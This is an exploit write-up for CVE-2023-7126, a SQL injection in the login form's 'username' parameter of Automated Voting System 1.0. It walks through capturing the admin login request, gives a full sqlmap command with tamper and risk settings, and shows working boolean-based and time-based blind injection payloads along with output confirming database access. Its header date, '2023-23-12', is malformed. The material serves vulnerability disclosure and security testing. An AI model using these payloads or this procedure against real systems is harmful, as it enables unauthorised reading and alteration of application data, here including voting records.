# CVE-2023-7126_Automated_Voting_System-SQL_Injection-1
+ **Exploit Title:** CVE-2023-7126_Automated_Voting_System-SQL_Injection-1
+ **Date:** 2023-23-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/automated-voting-system-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/02/AUTOMATED_VOTING_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** CVE-2023-7126

## References: 
+ **CVE-2023-7126:** https://vuldb.com/?id.249129
+ https://www.cve.org/CVERecord?id=CVE-2023-7126
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-7126
+ https://nvd.nist.gov/vuln/detail/CVE-2023-7126

## Description:
Automated Voting System 1.0 allows SQL Injection via parameter 'username' in "/automated%20voting/admin/". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the admin panel: "http://localhost/automated%20voting/admin/"
+ Fill the username and password then click 'Login' button.
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Use sqlmap to exploit.
+ In sqlmap, use 'username' parameter to dump the database. 
```
sqlmap -r r.txt -p username --risk 3 --level 5 --threads 1 --random-agent tamper=between, randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
```

```
---
Parameter: MULTIPART username ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: -----------------------------192279164335952871372031982036
Content-Disposition: form-data; name="username"

-1676' OR 6176=6176-- hmdo
-----------------------------192279164335952871372031982036
Content-Disposition: form-data; name="password"

pass
-----------------------------192279164335952871372031982036
Content-Disposition: form-data; name="login"


-----------------------------192279164335952871372031982036--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------192279164335952871372031982036
Content-Disposition: form-data; name="username"

adminn' AND (SELECT 7935 FROM (SELECT(SLEEP(5)))MYPj)-- oinA
-----------------------------192279164335952871372031982036
Content-Disposition: form-data; name="password"

pass
-----------------------------192279164335952871372031982036
Content-Disposition: form-data; name="login"


-----------------------------192279164335952871372031982036--
---
[19:21:50] [INFO] testing MySQL
got a 302 redirect to 'http://localhost/automated%20voting/admin/candidate.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[19:21:50] [INFO] confirming MySQL
[19:21:52] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[19:21:52] [INFO] fetching current database
[19:21:52] [INFO] resumed: voting
current database: 'voting'
```

+ current database: `voting`
![01](https://github.com/h4md153v63n/CVEs/assets/5091265/654f8856-e854-4018-8208-8ca07971bb50)
